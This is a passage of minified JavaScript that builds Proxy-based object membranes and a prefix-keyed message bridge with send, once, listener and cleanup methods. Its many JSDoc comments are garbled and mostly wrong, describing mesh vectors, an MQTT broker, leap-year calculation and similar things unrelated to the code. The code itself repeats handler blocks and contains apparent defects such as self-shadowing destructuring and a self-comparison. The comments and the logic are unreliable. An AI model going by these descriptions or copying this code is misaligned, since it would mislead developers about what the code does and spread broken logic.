                         * @param { number } n - property being set or retrieved from the object, and is used
                         * to determine whether the method can be called on the object and what type of
                         * operation is being performed.
                         * 
                         * @param { object } o - object that is being manipulated, and its values are used
                         * to determine whether or not the setter method for the object's properties can be
                         * called.
                         * 
                         * @returns { `undefined` value. } a boolean value indicating whether the property
                         * assignment was successful.
                         * 
                         * 		- `r`: The result of calling the `set` method on the `s[n]` property, if it
                         * exists and has a `set` method.
                         * 		- `d`: The value of the `a[n]` property, which is used to determine if the
                         * property is writable.
                         * 		- `o`: The output of the `set` function, which is returned if the `s[n]` property
                         * exists and has a `set` method, or if any of the properties of `a[n]` are writable.
                         * 		- `p(x)`: A function that returns `true` if the value `x` is primitive, otherwise
                         * it returns `false`.
                         * 		- `Gt(x)`: A function that returns the Greatest Value of `x`, which is used to
                         * restore the original value of a property after it has been modified.
                         * 		- `l(n)`: A function that checks if the `s[n]` property is loose, meaning if it
                         * is not a primitive value.
                         * 
                         * 	The properties of the output are explained below:
                         * 
                         * 		- `!0`: If the output is a boolean value, it returns `!0` indicating that the
                         * operation was successful. Otherwise, it returns `!1`.
                         * 		- `o.configurable`: If the `a[n]` property is configurable, it means that its
                         * value can be modified.
                         * 		- `o.writable`: If the `a[n]` property is writable, it means that its value can
                         * be modified.
                         * 		- `o.value`: The value of the `a[n]` property, which can be a primitive or a function.
                         * 		- `o.get`: If the `a[n]` property has a `get` method, it returns the result of
                         * calling the `get` method. Otherwise, it returns `undefined`.
                         * 		- `o.set`: If the `a[n]` property has a `set` method, it returns the result of
                         * calling the `set` method. Otherwise, it returns `undefined`.
                         */
                        set: (e,n,o)=>{
                            const r = s[n];
                            if (r && r.set)
                                return r.set(o),
                                !0;
                            const {d} = a[n];
                            return !(d && !d.writable && !It(d, "set") || l(n) || (delete s[n],
                            vt(a, n, o),
                            l(n) && o && o.configurable && o.writable && o.value && "function" == typeof o.value && !p(o.value) && (o.value = Gt(o.value)),
                            l(n) && o && !o.configurable && "function" == typeof o.get && !p(o.get) && (o.get = Gt(o.get)),
                            l(n) && o && !o.configurable && "function" == typeof o.set && !p(o.set) && (o.set = Gt(o.set)),
0))
                        }
                    });
                    Ht(gt(u), (e=>{
                        s[e] = s[e] || Gt({
                            bind: !0
                        })
                    }
                    ));
                    const c = Gt({})
                      , d = Gt({});
                    Lt(d, hn, "Window");
                    const f = new Un(d,Gt({
                        /**
                         * @description sets or deletes a property on an object. It takes three arguments:
                         * the object, the property name, and the property value. If the property is set, it
                         * also checks if the property can be changed (configurable) and writes back the
                         * updated value.
                         * 
                         * @param { object } e - 4th argument passed to the function, which is used to determine
                         * whether an object property can be deleted based on its configurable and enumerable
                         * properties.
                         * 
                         * @param { object } t - 2nd argument passed to the function, which is an object
                         * containing properties related to the target property of the method.
                         * 
                         * @param { number } n - object to be iterated over and passed as an argument to the
                         * `vt()` and `lt()` functions.
                         * 
                         * @returns { object } an object with property keys set to their corresponding values.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && c[t] || o && o.get && !o.set ? (vt(r ? d : zn, t, s),
                            !1) : (vt(d, t, s),
                            l(t) && s && s.configurable && s.writable && s.value && "function" == typeof s.value && !p(s.value) && (s.value = Gt(s.value)),
                            l(t) && s && !s.configurable && "function" == typeof s.get && !p(s.get) && (s.get = Gt(s.get)),
                            l(t) && s && !s.configurable && "function" == typeof s.set && !p(s.set) && (s.set = Gt(s.set)),
                            delete c[t],
                            !0)
                        }
                        ,
                        /**
                         * @description checks if a property exists on an object or array, then deletes it
                         * along with any nested properties. If the property is not found, it returns `false`.
                         * 
                         * @param { object } e - property object to which the logic in the function is applied.
                         * 
                         * @param { object } t - 2D matrix of which an element is to be updated.
                         * 
                         * @returns { boolean } `true` if the property can be deleted, and `false` otherwise.
                         */
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = d[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            l(t) && o && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete d[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description is a getter that retrieves the value of an object property. It checks
                         * if the property exists and is either a primitive or has a `get` method. If it's a
                         * primitive, it returns its value. If it has a `get` method, it calls that method
                         * and returns its result.
                         * 
                         * @param { object } e - getter or setter method that is called when the `zn` object's
                         * `t` property is accessed.
                         * 
                         * @param { object } t - key of an object in the `zn` object, and is used to determine
                         * the value or method associated with that key.
                         * 
                         * @returns { : `o.value`. } a value or an object that contains a `value` or `get`
                         * property, depending on the type of input provided.
                         * 
                         * 		- `o.once`: A boolean indicating whether the `get` function is only called once
                         * during its execution. If it's `true`, then it has only been called once.
                         * 		- `o.bind`: A boolean indicating whether the `get` function can be bound to a
                         * specific context or not. If it's `true`, then the function can be bound.
                         * 		- `r.d`: The data property of the result returned by the `get` function, which
                         * can be a value or an object. If it's an object, then `r` has an `e` property that
                         * is a boolean indicating whether the `get` function was called with an expression
                         * (i.e., `r` has an `e` property that's `true`).
                         * 		- `It(r, "value")` and `It(r, "get"``: Functions used to extract the value or
                         * method from an object. The `It` function is defined later in the code snippet provided.
                         * 		- `Gt(o)`: A function used to destructure the output of the `get` function,
                         * returning only the `value` property if it exists, or the entire output object if
                         * there's no `value` property.
                         * 
                         * 	These properties / attributes provide information about the returned value and
                         * its usage in further processing or evaluation.
                         */
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = d[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description returns an object representing a property's descriptor on an object,
                         * taking the property name and the object to get the descriptor from as input.
                         * 
                         * @param { object } e - 💫 property descriptor for the target object.
                         * 
                         * @param { object } t - property or method to which the `get` and `set` methods are
                         * applied in the function.
                         * 
                         * @returns { object } a descriptor object containing property details for a given
                         * object and property name.
                         */
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = d[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!l(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(d, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in d,
                        /**
                         * @description returns an array of keys that are not present in a given object or
                         * its children objects. It uses recursive combination to generate the array, starting
                         * from the object and its ancestor objects.
                         * 
                         * @returns { integer } an array of integers representing the own enumerable property
                         * keys of an object.
                         */
                        ownKeys: ()=>{
                            const e = e=>!(e in c)
                              , t = gt(c)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(d, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        /**
                         * @description is passed a value and an object `zn`. It checks if the object has a
                         * `set` method, and if it does, it returns `true`. If not, it tries to determine
                         * whether the value can be set using other methods, such as `writable`, `configurable`,
                         * or `get`. If any of these methods are present and can be used to set the value,
                         * it returns `true`. If none of these methods can be used, it returns `false`.
                         * 
                         * @param { .................... } e - execution context for the function, allowing
                         * the function to access and manipulate variables within the context.
                         * 
                         * 		- `t`: The timer ID of the observed object.
                         * 		- `n`: The observable object being observed.
                         * 		- `o`: The original object from the timeline.
                         * 		- `d`: The observed dictionary containing the `set` function.
                         * 
                         * 	The `set` function returns `true` if the observed object's value was modified,
                         * otherwise it returns `false`. The function also checks if the object is writable
                         * and configurable before making any changes to its value. If the object is not
                         * writable or configurable, the function does nothing. Additionally, the function
                         * checks if the `set` method is defined on the object, and if so, uses the method
                         * to set the value instead of directly setting it.
                         * 
                         * 
                         * @param { object } t - variable that the function is called on, and is used to
                         * determine whether the variable has been deleted or not.
                         * 
                         * @param { number } n - value to be set for a property of an object, which the
                         * function determines whether it can be modified based on its type and other factors
                         * before returning a boolean value indicating whether the set operation was successful.
                         * 
                         * @returns { `Undefined`. } a boolean value indicating whether the assignment was successful.
                         * 
                         * 		- `o`: The output value is stored in the `o` variable, which is a reference to
                         * the output value.
                         * 		- `d`: If the `set` function is successful, the output value is also assigned
                         * to the `d` variable, which is a reference to the object containing the `t` property.
                         * 		- `n`: The `n` variable is used as the input parameter for the `set` function,
                         * and its value is used to set the `t` property of the `d` variable.
                         * 		- `p`: The `p` variable is used to check whether the output value can be modified.
                         * If it cannot be modified, then the `n` variable is assigned the `Gt` value.
                         * 		- `It`: The `It` variable is used to check if the `set` function can be called
                         * on the `d` variable.
                         * 		- `l`: The `l` variable is used to check if the `set` function can be called on
                         * the `t` property of the `d` variable.
                         * 		- `Gt`: If the output value cannot be modified, then its value is assigned to
                         * the `n` variable and stored in the `Gt` variable for future use.
                         */
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = d[t];
                            return !(d && !d.writable && !It(d, "set") || l(t) || (delete zn[t],
                            vt(d, t, n),
                            l(t) && n && n.configurable && n.writable && n.value && "function" == typeof n.value && !p(n.value) && (n.value = Gt(n.value)),
                            l(t) && n && !n.configurable && "function" == typeof n.get && !p(n.get) && (n.get = Gt(n.get)),
                            l(t) && n && !n.configurable && "function" == typeof n.set && !p(n.set) && (n.set = Gt(n.set)),
                            0))
                        }
                    }));
                    return f
                }
                )({
                    sendPrefix: n.sendPrefix,
                    listenPrefix: n.listenPrefix
                });
                let s = null;
                /**
                 * @description creates an instance of `EventEmitter` and defines various event
                 * listeners for `send`, `once`, `setMessageListener`, and `cleanup`. It returns an
                 * object with these listeners.
                 * 
                 * @param { object } t - 2nd argument passed to the `Ht()` function, which is used
                 * to specify the message handler function to be executed when the observer listens
                 * for messages on the specified topic.
                 * 
                 * @param { HTML HTMLElement reference. } n - HTMLElement object that serves as the
                 * root element for the event handling and message listening operations performed by
                 * the returned `r` object.
                 * 
                 * 		- `o`: A client-side object that encapsulates the event loop and the current
                 * HTTP request.
                 * 		- `t`: The top-level frame of the event loop, containing the callbacks for
                 * handling the HTTP request.
                 * 		- `e`: An object representing the current HTTP request.
                 * 		- `Gt`: A function used to create a new client-side object.
                 * 		- `Ht`: A function used to send an HTTP response to the client.
                 * 		- `vt`: A function used to set a message listener on the event loop.
                 * 		- `s`: An internal function used to clean up the event loop when it is no longer
                 * needed.
                 * 		- `listenPrefix`: A string representing the prefix of the URL path that indicates
                 * a listen event.
                 * 		- `sendPrefix`: A string representing the prefix of the URL path that indicates
                 * a send event.
                 * 
                 * 	Note that `n` is not destructured directly in the provided code, but its properties
                 * are explained as needed to understand its various attributes and methods.
                 * 
                 * 
                 * @returns { object } an object with various methods for sending and listening to
                 * messages, as well as cleaning up the `o` and `s` objects.
                 */
                const a = ((t,n)=>{
                    const o = Gt({});
                    Ht(gt(n), (t=>{
                        vt(o, t, Gt(e[t]))
                    }
                    ));
                    const r = {
                        /**
                         * @description takes two arguments, `e` and `t`, and creates a new object called `s`
                         * with methods to send messages to a MQTT broker using the `GT` library. The function
                         * then calls the `send` method on the `o` object with the message prefix string as
                         * an argument.
                         * 
                         * @param { number } e - 2D vector of an edge in the mesh.
                         * 
                         * @param { array } t - 2D vector transformation that is applied to the mesh before
                         * it is sent over the network.
                         */
                        send: (e,t)=>{
                            const s = Gt({
                                m: e,
                                a: t,
                                r: null
                            });
                            o.send(n.sendPrefix, s)
                        }
                        ,
                        /**
                         * @description is called with two arguments: `e` and `n`. When `e` emits an event,
                         * it triggers `n` to listen to that event once.
                         * 
                         * @param { event. } e - event that triggers the function to call the `listenPrefix`
                         * method on the `o` object.
                         * 
                         * 		- `e`: The input to be listened to once. It is an event object containing
                         * information about the event that triggered the function's execution.
                         * 		- `t`: A special object called a "event transformer" which acts as a wrapper
                         * around `e`, providing additional functionality such as listening to events on a
                         * prefixed namespace.
                         * 
                         * 
                         * @param { EventTarget. } t - 2nd event emitter that listens to the `n.listenPrefix`
                         * event.
                         * 
                         * 		- `t`: A global object that is the target of the `once` function. It has a
                         * `listenPrefix` property and can be manipulated by the function.
                         */
                        once: (e,t)=>{
                            o.once(n.listenPrefix, (n=>{
                                t.once(e, n)
                            }
                            ))
                        }
                        ,
                        setMessageListener: e=>{
                            o.setMessageListener((t=>{
                                const o = t.m
                                  , r = t.a;
                                "ack" === o ? e(null, r) : e({
                                    method: o,
                                    args: r
                                })
                            }
                            ))
                        }
                        ,
                        /**
                         * @description and the `s` method are executed in this function.
                         */
                        cleanup: ()=>{
                            o.cleanup(),
                            s && s()
                        }
                    };
                    return r
                }
                )({
                    sendPrefix: t.sendPrefix,
                    listenPrefix: t.listenPrefix
                }, i);
                const l = {
                    /**
                     * @description updates the value of `a` by sending the event `e` and `t` as arguments
                     * to its callback.
                     * 
                     * @param { unknown (type-less). } e - 2D vector of event coordinates passed to the
                     * `a.send()` method.
                     * 
                     * 		- `e`: A complex object that is the output of the deserialization process. Its
                     * exact properties and attributes depend on the serialization format used to produce
                     * the input.
                     * 
                     * 
                     * @param { 𝑭 value. } t - event to be sent to the `a` module.
                     * 
                     * 		- `e`: The error object that was passed in as the second argument to `send`. It
                     * can hold information such as the error message or stack trace.
                     * 		- `t`: The deserialized input that was passed in as the first argument to `send`.
                     * It can have various properties and attributes, including:
                     * 		+ `type`: The type of input that was provided (e.g., string, number, object).
                     * 		+ `data`: The deserialized data itself.
                     * 		+ `error`: An optional property containing additional information about the
                     * deserialization error, such as a stack trace or error message.
                     */
                    send: (e,t)=>{
                        a.send(e, t)
                    }
                    ,
                    /**
                     * @description attaches an event listener to an element and triggers it only once
                     * when the event occurs.
                     * 
                     * @param { object } e - event that is once triggered by the function.
                     * 
                     * @param { `Event` value. } t - event that triggers the method call in the `once()`
                     * function.
                     * 
                     * 		- Type: The input to the `once` function is a typed object.
                     * 		- ETag: The `etag` property is included in the input object and represents the
                     * entity tag for the deserialized data. It can be used for caching purposes.
                     * 		- headers: The `headers` property contains additional HTTP headers associated
                     * with the deserialized data. These headers may contain information such as timestamps,
                     * error codes, or other metadata.
                     */
                    once: (e,t)=>{
                        a.once(e, t)
                    }
                    ,
                    setMessageListener: e=>{
                        a.setMessageListener(e)
                    }
                    ,
                    /**
                     * @description performs any necessary cleaning or preparation before finishing or
                     * ending something, typically by disposing of temporary resources or finalizing state
                     * changes.
                     */
                    cleanup: ()=>{
                        a.cleanup()
                    }
                };
                return l
            }
            )((e=>{
                const t = {};
                return e.send && (t.send = e.send),
                e.once && (t.once = e.once),
                e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                t
            }
            )(n)),
            r.bridges.second = i,
            {
                createProxy: e=>{
                    let t = r;
                    /**
                     * @description manages an event listener and a function for a specific event `n`.
                     * It removes the event listener when the event occurs and deletes the function from
                     * a `d` object if the event is captured.
                     * 
                     * @param { Function. } e - 2nd argument passed to the ` mn()` function, which returns
                     * the index of a property in an object.
                     * 
                     * 		- `n`: The unique event name that was assigned to the input `e`.
                     * 		- `m`: The number of times the event `n` has been triggered, as retrieved from
                     * the `mn()` function.
                     * 		- `d`: An object containing data associated with the event `n`.
                     * 		- `s`: The target element to which the event `n` was dispatched, as specified
                     * in the input `e`.
                     * 		- `e`: The original input `e`, which may have been modified within the function.
                     * 		- `t`: A reference to the element that triggered the event `n`.
                     * 
                     * 
                     * @param { object } t - element that the function is working on and is used to remove
                     * event listeners and cache functions.
                     */
                    const n = e=>{
                        let o, n;
                        const r = (o = Nt(t, e)) || (n = Nt(s, e));
                        return Gt({
                            d: r,
                            l: !!o,
                            w: !!n
                        });
                    }
                      , o = e=>{
                        if (!a(e))
                            return !1;
                        if ("length" === e)
                            return !0;
                        const t = wt($n(e));
                        return t >= 0 && t <= rn && e === `${t}`
                    }
                      , r = e=>"on" === mn(e, 0, 2)
                      , i = (e,t)=>{
                        const n = mn(e, 2)
                          , i = d[n];
                        if (i && (t.removeEventListener(n, i),
                        delete d[n]),
                        t && (e=>"function" == typeof e)(t)) {
                            const e = (...e)=>Rt(t, s, e);
                            t.addEventListener(n, e),
                            d[n] = e
                        }
                    }
                      , s = Gt({})
                      , a = Gt({})
                      , u = new Un(a,Gt({
                        /**
                         * @description modifies an object's properties based on a provided descriptor. It
                         * sets configurable and enumerable values, creates getters and setters for
                         * non-configurable properties, and deletes the property from the underlying array.
                         * 
                         * @param { number } e - object being tested for configurability, enumerability, and
                         * writability.
                         * 
                         * @param { object } t - name of the property being checked for configurability and
                         * writability in the function.
                         * 
                         * @param { object } n - object to be checked for configurable and enumerable properties,
                         * and its values are used to determine whether properties can be overridden or not.
                         * 
                         * @returns { 'undefined' value. } an object with property name, value, and a flag
                         * indicating whether the property is configurable or enumerable.
                         * 
                         * 		- o and r: These are the property and its original value respectively.
                         * 		- d and l: These represent the property's descriptor and its laxative respectively.
                         * 		- s: This is the property's getter function or the property itself if it has a
                         * non-configurable writable value.
                         * 		- vt: This is a method that returns true if the property is a valid getter/setter,
                         * false otherwise.
                         * 		- u: This is an object used to store properties and their original values for reference.
                         * 		- t: This is the name of the property being defined.
                         * 		- n: This is the object on which the property is defined.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = n(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && u[t] || o && o.get && !o.set ? (vt(r ? a : s, t, s),
                            !1) : (vt(a, t, s),
                            a[t] && a[t].configurable && a[t].writable && a[t].value && "function" == typeof a[t].value && !p(a[t].value) && (a[t].value = Gt(a[t].value)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].get && !p(a[t].get) && (a[t].get = Gt(a[t].get)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].set && !p(a[t].set) && (a[t].set = Gt(a[t].set)),
                            delete u[t],
                            !0)
                        }
                        ,
                        /**
                         * @description deletes an property from an object or a string value from an array,
                         * while handling nested properties and recursive references.
                         * 
                         * @param { array } e - object that contains the desired property values to be set
                         * or deleted in the code's execution.
                         * 
                         * @param { object } t - 0-based index of an object property within the `a` or `s`
                         * objects, and is used to determine whether to delete the property and its value
                         * from those objects.
                         * 
                         * @returns { boolean } `true` if the property does not exist or its value is falsey,
                         * otherwise it returns `false`.
                         */
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = a[t];
                            return !(!n || !n.configurable) && (o && (o = delete s[t],
                            a[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete a[t]),
                            delete s[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description is called to retrieve a value or method from an object. If the object
                         * has a `once` property and the value is deleted, the function returns the value.
                         * Otherwise, it calls the object's `get` method and returns the result.
                         * 
                         * @param { object } e - `get` method of an object, if it exists, and returns its
                         * value if it is a function.
                         * 
                         * @param { ⌿ (function). } t - 4th argument passed to the function, which is used
                         * to determine the value or method to return.
                         * 
                         * 		- `s`: A plain object containing the data to be serialized (given)
                         * 		- `a`: An object containing the configuration options for serialization (also given)
                         * 		- `o`: The deserialized input `t`, which can have various properties such as
                         * `value` or `get`, among others.
                         * 
                         * 
                         * @returns { any } the value of the nested object property, or the result of calling
                         * the `get` method if it exists and is a function.
                         */
                        get: (e,t)=>{
                            const o = s[t];
                            if (o) {
                                if (o.once && delete s[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = a[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description evaluates object properties based on the provided key. It returns a
                         * descriptor if it exists; otherwise, it creates a descriptor with specified enumerable,
                         * configurable, writable, and value properties or sets a property if necessary.
                         * 
                         * @param { object } e - object being observed, which is used to retrieve or update
                         * its property values.
                         * 
                         * @param { object } t - property key of an object and is used to retrieve or set the
                         * property value based on its enumerable, configurable, writable, and other attributes.
                         * 
                         * @returns { object } an object representing a property descriptor, containing the
                         * property name, value, enumerability, configurability, writability, and get/set functions.
                         */
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = a[t];
                            if (!o) {
                                const e = s[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!a(t))
                                    return;
                                o = Nt(s, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = s),
                                    Gt(t)
                                }
                                )
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in s || t in a,
                        /**
                         * @description iterates over the keys of an object and returns a new object with the
                         * keys that are not present in a specified object or subset of keys.
                         * 
                         * @returns { array } an array of strings representing the property keys in the object
                         * `o`.
                         */
                        ownKeys: ()=>{
                            const e = e=>!(e in u)
                              , t = gt(u)
                              , n = Ft(gt(ht(s)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(a, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        /**
                         * @description sets a value within an object. It checks if the value can be set, and
                         * if so, it sets the value using the appropriate get or set function for the type
                         * of the value.
                         * 
                         * @param { number } e - 5th argument of the `function` passed as an argument to the
                         * `vt()` method, which is used to determine the type of the value being set or gotten.
                         * 
                         * @param { object } t - name of the property or method being accessed, and is used
                         * to determine the type of action to take based on the value of the property or
                         * method and its configurability.
                         * 
                         * @param { number } n - value that is being set or retrieved for the corresponding
                         * property in the object `s`.
                         * 
                         * @returns { `undefined` value. } a boolean value indicating whether the property
                         * was set successfully.
                         * 
                         * 		- If `o && o.set`, the set function returns `!0`, indicating that the set operation
                         * was successful.
                         * 		- The `d` property of the `a` object is accessed and evaluated to a value. If
                         * `d` is not configurable, writable, or has a value, the function returns `!1`.
                         * 		- If `d && d.writable && !d.value`, the function tries to assign a new value to
                         * the `d` property of the `a` object. The value is determined by calling the `value`
                         * method of the `d` object if it exists, otherwise it is set to the result of calling
                         * the `get` method of the `d` object if it exists and returning its value, or setting
                         * it directly if no `get` method exists.
                         * 		- If `d && d.configurable`, the function tries to assign a new value to the `d`
                         * property of the `a` object by calling the `set` method of the `d` object if it
                         * exists, otherwise it sets the value directly.
                         * 		- If `!d.writable || !It(d, "set")`, the function does not attempt to set the
                         * `d` property of the `a` object and returns `!1`.
                         * 		- The `vt` function is called with the arguments `(a, t, n)`.
                         * 		- If `a[t]` exists and its value can be assigned, the function tries to assign
                         * a new value to the `a[t]` property. If no `value` method exists, the function
                         * returns `!1`. Otherwise, the function attempts to set the value by calling the
                         * `set` method of the `a[t]` object if it exists and returns its value, or sets the
                         * value directly if no `set` method exists.
                         * 		- The `Gt` function is called with the arguments `(a[t].value)`.
                         */
                        set: (e,t,n)=>{
                            const o = s[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = a[t];
                            return !(d && !d.writable && !It(d, "set") || a(t) || (delete s[t],
                            vt(a, t, n),
                            a[t] && a[t].configurable && a[t].writable && a[t].value && "function" == typeof a[t].value && !p(a[t].value) && (a[t].value = Gt(a[t].value)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].get && !p(a[t].get) && (a[t].get = Gt(a[t].get)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].set && !p(a[t].set) && (a[t].set = Gt(a[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(u), (e=>{
                        s[e] = s[e] || Gt({
                            bind: !0
                        })
                    }
                    ));
                    const c = Gt({})
                      , d = Gt({});
                    Lt(d, hn, "Window");
                    const f = new Un(d,Gt({
                        /**
                         * @description modifies an object's property by setting its configurable, enumerable,
                         * and value attributes, as well as defining getters and setters for those properties.
                         * 
                         * @param { object } e - 3rd argument passed to the `i()` function, which returns an
                         * object containing properties for the given value of `t`.
                         * 
                         * @param { object } t - property being accessed and is used to determine whether the
                         * property can be modified or not.
                         * 
                         * @param { ........................... } n - property name being searched for in the
                         * object.
                         * 
                         * 		- `d`: The enumerable value of the property (optional)
                         * 		- `l`: The writable value of the property (optional)
                         * 		- `s`: The configurable value of the property (optional)
                         * 		- `t`: The property name (required)
                         * 		- `c`: A cache object (required)
                         * 
                         * 
                         * @returns { object } an object containing the newly defined property, along with
                         * its attributes and value.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && c[t] || o && o.get && !o.set ? (vt(r ? d : zn, t, s),
                            !1) : (vt(d, t, s),
                            d[t] && d[t].configurable && d[t].writable && d[t].value && "function" == typeof d[t].value && !p(d[t].value) && (d[t].value = Gt(d[t].value)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].get && !p(d[t].get) && (d[t].get = Gt(d[t].get)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].set && !p(d[t].set) && (d[t].set = Gt(d[t].set)),
                            delete c[t],
                            !0)
                        }
                        ,
                        /**
                         * @description removes properties from an object, ensuring that the property is not
                         * defined and has no effect on the function's execution.
                         * 
                         * @param { object } e - property object in which the code is operating, providing
                         * access to its properties and methods for manipulation.
                         * 
                         * @param { string } t - 4th element of an array `d`, which is used to determine
                         * whether or not to delete the element and its associated value from the object `e`
                         * and the array `d`.
                         * 
                         * @returns { boolean } true if the property exists and can be deleted, otherwise false.
                         */
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = d[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            d[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete d[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description retrieves a value or calls a method on an object based on its properties
                         * and method definitions.
                         * 
                         * @param { integer } e - result of calling the `get` method on the object `d[t]`.
                         * 
                         * @param { object } t - name of an object or function that contains the desired value
                         * or method to be returned.
                         * 
                         * @returns { : `void 0`. } the value of the target property, or an object containing
                         * the `value` and `get` properties if the property is a method.
                         * 
                         * 		- `o`: The object returned by the `get` function, which can have properties
                         * `value`, `once`, `bind`, and `d`.
                         * 		- `value`: A boolean indicating whether the property `value` is present in the
                         * `o` object.
                         * 		- `once`: A boolean indicating whether the property `once` is present in the `o`
                         * object.
                         * 		- `bind`: A boolean indicating whether the property `bind` is present in the `o`
                         * object.
                         * 		- `d`: An object that contains the properties `value` and `r`, where `r` is the
                         * value of the `d` property.
                         * 		- `e`: An expression that represents the `get` function, which can take the form
                         * of a function or a string representing the function.
                         * 
                         * 	In summary, the output of the `get` function depends on the properties of the
                         * input object and can be either a boolean or an object with specific properties.
                         */
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = d[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description 1) retrieves or sets a property descriptor on an object based on a
                         * given property name and 2) updates the property descriptor if the property exists.
                         * 
                         * @param { object } e - Object Prototype of the value returned by the `get()` method,
                         * which is used to set the prototype of the new object created by the function.
                         * 
                         * @param { object } t - 2-dimensional array of configuration object, which provides
                         * the properties to be set or retrieved for the corresponding enumerated value.
                         * 
                         * @returns { object } a descriptor object containing the property name, value,
                         * enumerability, configurability, and writability.
                         */
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = d[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(d, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in d,
                        /**
                         * @description returns an array of keys for an object.
                         * 
                         * @returns { array } an array of unique values.
                         */
                        ownKeys: ()=>{
                            const e = e=>!(e in c)
                              , t = gt(c)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(d, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        /**
                         * @description is passed the name of a property on an object `o`, checks if it has
                         * a setter method, and calls that method to set the value. If the property is writable,
                         * it also sets the value itself.
                         * 
                         * @param { string } e - 4-digit year for which to calculate the leap years.
                         * 
                         * @param { object } t - name of the property or method being accessed, which is used
